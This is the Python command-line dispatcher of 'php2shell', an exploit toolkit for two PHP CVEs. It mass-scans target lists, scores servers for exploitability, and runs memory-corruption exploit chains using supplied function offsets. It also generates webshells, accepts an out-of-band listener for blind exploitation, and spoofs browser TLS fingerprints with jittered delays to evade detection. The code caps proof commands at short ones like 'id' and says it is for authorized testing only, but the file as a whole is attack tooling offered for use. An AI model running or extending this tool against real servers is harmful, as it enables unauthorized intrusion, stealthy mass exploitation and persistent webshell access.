#!/usr/bin/env python3
"""php2shell.py — ONE CLI for detect + preflight + exploit + shell + report.

Modes:
  scan       targets.txt -> detect -> preflight -> (optional) exploit -> report
  detect     one or more URLs, detection only (non-destructive)
  preflight  one URL, exploit readiness score
  exploit    one URL, straight to the chain engine (READY + confirmation)
  shell      call shell/safe_shell.py (generator, not an uploader)
  version    print toolkit version + chain sha256 + fix-floor map

Guards enforced in CODE (cannot be disabled from the CLI):
  - exploit only on READY targets + confirmation (--yes or answer y)
  - default command `id` (proof-of-access), max 14 bytes, no chaining
  - --revshell DOES NOT EXIST in the parser and is blocked at the runner
  - every request goes through the same stealth transport (consistent JA3)

Architecture: the 5 CVE chains run as subprocesses from exploit/
(pure_off.py, remote_cve.py, auto_exp.py, handler_mismatch.py,
var_destroy_uaf_rce.php). lib/chain.py dispatches; lib/exploit_runner.py
enforces guards.

Flag name mapping:
  --ja3              TLS fingerprint profile (chrome/firefox/safari/...)
  --chain            which exploit chain to run (pure|remote|local|mismatch)
  --exploit-profile  OFFSET profile of the chain engine (lab|bookworm)
"""

from __future__ import annotations

import argparse
import hashlib
import os
import subprocess
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))

from lib import banner as banner_mod  # noqa: E402
from lib import detect as detect_mod  # noqa: E402
from lib import preflight as preflight_mod  # noqa: E402
from lib import reporter  # noqa: E402
from lib.exploit_runner import (  # noqa: E402
    DEFAULT_CMD, build_command_preview, proof_cmd_for,
    set_allowed_cmds, validate_command,
)
from lib.exploit_runner import run as run_exploit  # noqa: E402
from lib.transport import (  # noqa: E402
    DEFAULT_DELAY, HAVE_CURL_CFFI, PROFILES, Transport, load_targets,
)

CVE_IDS = banner_mod.CVE_IDS
CVE_CHOICES = ("CVE-2026-109618", "CVE-2026-109619")
CVE_SUPPORTED = ("CVE-2026-109619",)
VERSION = "2.0.0"

SHOWN = False


def chain_sha256() -> str:
    try:
        with open(os.path.join(HERE, "lib", "chain.py"), "rb") as fh:
            return hashlib.sha256(fh.read()).hexdigest()
    except OSError:
        return ""


def _banner(args=None, mode: str = "", force: bool = False) -> None:
    global SHOWN
    if SHOWN and not force:
        return
    SHOWN = True
    profile = getattr(args, "ja3", None) if args else None
    delay = getattr(args, "delay", None) if args else None
    print(banner_mod.render(
        mode=mode, profile=profile or "", delay=delay or 0.0,
        stealth=HAVE_CURL_CFFI, version=VERSION))
    sha = chain_sha256()
    if sha:
        print(f"  chain engine: lib/chain.py sha256={sha}")
    print()


def _require_scheme(url: str) -> str:
    if not url.lower().startswith(("http://", "https://")):
        raise SystemExit(
            f"php2shell: error: URL must start with http:// or https:// "
            f"(got: {url!r})")
    return url


def _detect_one(url: str, t: Transport, args) -> dict:
    d = detect_mod.detect(
        url, transport=t,
        check_upload_progress=not args.no_upload_progress,
        check_display_errors=not args.no_display_errors,
        check_oom=False if getattr(args, "no_oom", False) else None,
        sapi=getattr(args, "sapi", "auto") or "auto")
    p = preflight_mod.preflight(d)
    return {"url": url, "detect": d.as_dict(), "preflight": p.as_dict()}


def _mk_transport(args) -> Transport:
    return Transport(
        profile=args.ja3, delay=args.delay, timeout=args.timeout,
        proxy=args.proxy, audit_log=args.audit,
        verbose=bool(getattr(args, "verbose", False)))


def _confirm(n: int, args) -> bool:
    if getattr(args, "yes", False):
        return True
    if not sys.stdin.isatty():
        return False
    try:
        ans = input(f"Run the exploit on {n} target(s)? [y/N] ")
    except EOFError:
        return False
    return ans.strip().lower() in ("y", "yes")


def _hex(v):
    return int(v, 0) if v else None


def _run_exploits(candidates: list[dict], args) -> None:
    try:
        wl = set_allowed_cmds(getattr(args, "allow_cmd", None))
        if getattr(args, "allow_cmd", None):
            print(f"  proof whitelist: {', '.join(wl)}")
    except ValueError as e:
        for r in candidates:
            r["exploit"] = {"success": False, "error": str(e)}
        print(f"  {e}")
        return

    cmd = args.cmd
    proof_name = getattr(args, "proof_file", None)
    if proof_name:
        try:
            cmd = proof_cmd_for(args.cmd, proof_name)
        except ValueError as e:
            for r in candidates:
                r["exploit"] = {"success": False, "error": str(e)}
            print(f"  {e}")
            return
        args.cmd = cmd

    why = validate_command(cmd)
    if why:
        for r in candidates:
            r["exploit"] = {"success": False, "error": why}
        print(f"  {why}")
        return

    opts = {"chain": args.chain, "profile": args.exploit_profile}
    print()
    for r in candidates:
        print("  " + build_command_preview(r["url"], cmd, opts))
    print()

    for r in candidates:
        print(f"  -> {r['url']}  chain={args.chain} cmd={cmd!r}", flush=True)
        try:
            res = run_exploit(
                r["url"], cmd=cmd, chain=args.chain,
                profile=args.exploit_profile or "bookworm",
                zif_offset=_hex(args.zif_offset),
                dtor_offset=_hex(args.dtor_offset),
                htdata_offset=_hex(args.htdata_offset),
                libphp=args.libphp or "",
                retries=args.retries or 3,
                proof_file=proof_name,
                timeout=args.exploit_timeout,
                quiet=not args.verbose,
                log=(lambda m: print(f"     {m}", flush=True)),
                seed=args.seed, fire=args.fire, gadget=args.gadget,
                prop=args.prop, php=args.php, probes=args.probes,
                oob=args.oob, workers=getattr(args, "workers", 1))
        except RuntimeError as e:
            r["exploit"] = {"success": False, "error": str(e)}
            print(f"     failed: {e}")
            continue
        r["exploit"] = res.as_dict()
        tag = "PROOF" if res.success else "failed"
        msg = res.proof or res.error or f"rc={res.returncode}"
        print(f"     {tag} ({res.duration:.1f}s): {msg}")


def _write_io(args, records, meta) -> None:
    meta = {**meta, "cve": CVE_IDS, "version": VERSION}
    if args.json:
        p = reporter.write_json(args.json, records, meta)
        print(f"json: {p}")
    if args.csv:
        p = reporter.write_csv(args.csv, records)
        print(f"csv : {p}")


# ---------------------------------------------------------------- modes ----

def cmd_detect(args) -> int:
    _banner(args, mode="detect")
    t = _mk_transport(args)
    urls = args.urls or load_targets(args.list)
    if not urls:
        print("no targets", file=sys.stderr)
        return 2
    records = []
    for u in urls:
        u = _require_scheme(u)
        rec = _detect_one(u, t, args)
        records.append(rec)
        d = rec["detect"]
        print(f"  {d['verdict']:<10} {d['url']}")
        if d["reason"]:
            print(f"             {d['reason']}")
        for s in d["signals"]:
            print(f"             + {s}")
        if d["error"]:
            print(f"             ! {d['error']}")
    t.close()
    print()
    print(reporter.table(records))
    print()
    print(reporter.summary(records))
    _write_io(args, records, {"mode": "detect"})
    return 0


def cmd_preflight(args) -> int:
    _banner(args, mode="preflight")
    t = _mk_transport(args)
    url = _require_scheme(args.url)
    rec = _detect_one(url, t, args)
    t.close()
    d, p = rec["detect"], rec["preflight"]
    print(f"URL          : {url}")
    print(f"verdict      : {d['verdict']} - {d['reason']}")
    print(f"PHP          : {d['php_version'] or 'not leaked'} (branch {d['branch'] or '?'})")
    print(f"upload_prog  : {d['upload_progress']}")
    print(f"display_err  : {d['display_errors']}")
    print()
    for k, v in p["checks"].items():
        print(f"  {k:<15}: {v}")
    print()
    for b in p["blockers"]:
        print(f"  BLOCKER: {b}")
    for n in p["notes"]:
        print(f"  note: {n}")
    print()
    print(f"score        : {p['score']}/{p['max_score']}")
    sup = p.get("support") or {}
    lvl = {"rce": "RCE", "leak": "LEAK ONLY", "no": "UNPROVEN",
           "unknown": "UNKNOWN"}.get(sup.get("level", ""), "?")
    print(f"support      : {lvl}")
    if sup.get("text"):
        print(f"               {sup['text']}")
    print(f"ready        : {'YES' if p['ready'] else 'NO'}")
    _write_io(args, [rec], {"mode": "preflight"})
    return 0


def cmd_scan(args) -> int:
    _banner(args, mode="scan")
    t = _mk_transport(args)
    urls = args.urls or load_targets(args.list)
    if not urls:
        print("no targets", file=sys.stderr)
        return 2
    records = []
    for u in urls:
        u = _require_scheme(u)
        rec = _detect_one(u, t, args)
        records.append(rec)
        d = rec["detect"]
        print(f"  {d['verdict']:<10} {d['url']}")
    t.close()
    print()
    print(reporter.table(records))
    print()
    print(reporter.summary(records))
    if args.exploit:
        candidates = [r for r in records if r["preflight"]["ready"]]
        if not candidates:
            print("\nno READY targets - exploit skipped")
        else:
            print(f"\n{len(candidates)} READY target(s)")
            if _confirm(len(candidates), args):
                _run_exploits(candidates, args)
            else:
                print("exploit not confirmed - skipped")
    _write_io(args, records, {"mode": "scan"})
    return 0


def cmd_exploit(args) -> int:
    _banner(args, mode="exploit")
    url = _require_scheme(args.url)
    t = _mk_transport(args)
    rec = _detect_one(url, t, args)
    t.close()
    d, p = rec["detect"], rec["preflight"]
    print(f"URL     : {url}")
    print(f"verdict : {d['verdict']} - {d['reason']}")
    print(f"score   : {p['score']}/{p['max_score']}")
    print(f"ready   : {'YES' if p['ready'] else 'NO'}")
    if not p["ready"]:
        print("\nexploit blocked (target not READY):")
        for b in p["blockers"]:
            print(f"  BLOCKER: {b}")
        return 2
    if not _confirm(1, args):
        print("exploit not confirmed - aborted")
        return 1
    _run_exploits([rec], args)
    _write_io(args, [rec], {"mode": "exploit"})
    return 0


def cmd_shell(args) -> int:
    _banner(args, mode="shell")
    script = HERE / "shell" / "safe_shell.py"
    if not script.exists():
        print(f"shell generator missing: {script}", file=sys.stderr)
        return 2
    cmd = [sys.executable, str(script)]
    if args.list_commands:
        cmd.append("--list-commands")
    else:
        cmd += ["--out", args.out, "--ttl", str(args.ttl)]
        if args.author:
            cmd += ["--author", args.author]
        if args.commands:
            cmd += ["--commands", args.commands]
        if args.password:
            cmd += ["--password", args.password]
    return subprocess.run(cmd).returncode


def cmd_version(args) -> int:
    print(f"php2shell {VERSION}")
    print(f"CVE tested : {CVE_IDS} (full chain)")
    print(f"CVE detect : CVE-2026-109618 (version classify; different chain, not run)")
    print(f"chain sha256: {chain_sha256()}")
    print(f"stealth    : {'curl_cffi JA3' if HAVE_CURL_CFFI else 'urllib fallback (pip install curl_cffi)'}")
    print("fix-floor  :")
    for b, v in banner_mod.FIX_FLOOR.items():
        print(f"  PHP {b}: {v}  (last vulnerable: {banner_mod.LAST_VULN[b]})")
    return 0


# ------------------------------------------------------------- argparse ----

def _add_common(p):
    g = p.add_argument_group("common options")
    g.add_argument("--ja3", choices=tuple(PROFILES.keys()), default="chrome",
                   help="TLS fingerprint profile (default %(default)s)")
    g.add_argument("--delay", type=float, default=DEFAULT_DELAY,
                   help="request delay seconds + jitter (default %(default)s)")
    g.add_argument("--timeout", type=int, default=15,
                   help="HTTP timeout seconds (default %(default)s)")
    g.add_argument("--proxy", default=None, help="HTTP/HTTPS proxy URL")
    g.add_argument("--audit", default=None, help="JSONL audit log path")
    g.add_argument("--no-upload-progress", action="store_true",
                   help="skip upload_progress probe")
    g.add_argument("--no-display-errors", action="store_true",
                   help="skip display_errors probe")
    g.add_argument("--no-oom", action="store_true", help="skip active OOM probe")
    g.add_argument("--sapi", choices=("auto", "fpm", "mod_php"), default="auto",
                   help="SAPI assumption for OOM probe (default %(default)s)")
    g.add_argument("-v", "--verbose", action="store_true", help="verbose transport log")


def _add_io(p):
    g = p.add_argument_group("output")
    g.add_argument("--json", default=None, help="write JSON report to this path")
    g.add_argument("--csv", default=None, help="write CSV report to this path")


def _add_exploit_flags(p):
    g = p.add_argument_group("chain engine options")
    g.add_argument("--chain", choices=("pure", "remote", "local", "mismatch"),
                   default="pure", help="which chain to run (default %(default)s)")
    g.add_argument("--cve", choices=CVE_CHOICES, default="CVE-2026-109619",
                   help="target CVE (default %(default)s). 109618 not implemented")
    g.add_argument("-c", "--cmd", default=DEFAULT_CMD,
                   help=f"proof command (default {DEFAULT_CMD!r}, max 14 bytes)")
    g.add_argument("--allow-cmd", action="append", default=None, metavar="CMD",
                   help="add a proof command (uname,hostname,pwd,ls,cat,df,uptime,who,w,env)")
    g.add_argument("--exploit-timeout", type=int, default=300,
                   help="timeout per exploit, seconds (default 300)")
    g.add_argument("--zif-offset", default=None, help="zif_system offset, e.g. 0x465370")
    g.add_argument("--dtor-offset", default=None, help="zend_hash_destroy offset")
    g.add_argument("--htdata-offset", default=None, help="hash table data offset")
    g.add_argument("--exploit-profile", choices=("lab", "bookworm"), default="bookworm",
                   help="OFFSET profile of the chain (NOT the TLS fingerprint)")
    g.add_argument("--libphp", default="", help="libphp.so to read offsets from (remote chain)")
    g.add_argument("--proof-file", default=None, metavar="NAME",
                   help="write proof to /out/NAME on target then read it back")
    g.add_argument("--retries", type=int, default=3, help="retries per stage (default 3)")
    g.add_argument("--probes", type=int, default=20, help="pure chain: probe count (default 20)")
    g.add_argument("--workers", type=int, default=1,
                   help="target prefork MaxRequestWorkers; >1 pins workers-1 "
                        "children so the chain hits one child (pure chain)")
    g.add_argument("--oob", default="", help="pure chain: OOB listener URL (blind mode)")
    g.add_argument("--seed", default="", help="mismatch chain: seed endpoint")
    g.add_argument("--fire", default="", help="mismatch chain: fire endpoint")
    g.add_argument("--gadget", default="Evil", help="mismatch chain: gadget class name")
    g.add_argument("--prop", default="cmd", help="mismatch chain: gadget property")
    g.add_argument("--php", default="php", help="local chain: PHP binary path")
    g.add_argument("--quiet", action="store_true", help="less output")


def build_parser() -> argparse.ArgumentParser:
    ap = argparse.ArgumentParser(
        prog="php2shell",
        description="php2shell — CVE-2026-109618/109619 exploit toolkit "
                    "(5 chains + JA3 stealth + mass scan + safe webshell). "
                    "Authorized testing only.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=banner_mod.GUARDS_TEXT)
    sub = ap.add_subparsers(dest="sub", required=False)

    # scan
    p = sub.add_parser("scan", help="targets.txt -> detect -> preflight -> (exploit) -> report")
    p.add_argument("-l", "--list", default=None, help="target list file (one URL per line)")
    p.add_argument("urls", nargs="*", help="one or more target URLs")
    p.add_argument("--exploit", action="store_true", help="also exploit READY targets")
    p.add_argument("--yes", action="store_true", help="skip confirmation prompt")
    _add_common(p)
    _add_exploit_flags(p)
    _add_io(p)
    p.set_defaults(func=cmd_scan)

    # detect
    p = sub.add_parser("detect", help="one or more URLs, detection only")
    p.add_argument("-l", "--list", default=None, help="target list file")
    p.add_argument("urls", nargs="*", help="one or more target URLs")
    _add_common(p)
    _add_io(p)
    p.set_defaults(func=cmd_detect)

    # preflight
    p = sub.add_parser("preflight", help="one URL, exploit readiness score")
    p.add_argument("url", help="target URL")
    _add_common(p)
    _add_io(p)
    p.set_defaults(func=cmd_preflight)

    # exploit
    p = sub.add_parser("exploit", help="one URL, run the chain (READY + confirm)")
    p.add_argument("url", help="target URL")
    p.add_argument("--yes", action="store_true", help="skip confirmation prompt")
    _add_common(p)
    _add_exploit_flags(p)
    _add_io(p)
    p.set_defaults(func=cmd_exploit)

    # shell
    p = sub.add_parser("shell", help="generate a password-protected webshell")
    p.add_argument("--out", default="./out", help="output directory")
    p.add_argument("--ttl", type=int, default=72, help="lifetime hours (default 72)")
    p.add_argument("--author", default="", help="name/handle for audit")
    p.add_argument("--commands", default="", help="whitelist comma-separated")
    p.add_argument("--password", default="", help="explicit password; empty = random")
    p.add_argument("--list-commands", action="store_true", help="show default commands and exit")
    p.set_defaults(func=cmd_shell)

    # version
    p = sub.add_parser("version", help="print toolkit version + chain sha256")
    p.set_defaults(func=cmd_version)

    return ap


def main() -> int:
    ap = build_parser()
    args = ap.parse_args()
    if not getattr(args, "sub", None):
        print(banner_mod.splash())
        return 0
    return int(args.func(args) or 0)


if __name__ == "__main__":
    sys.exit(main())
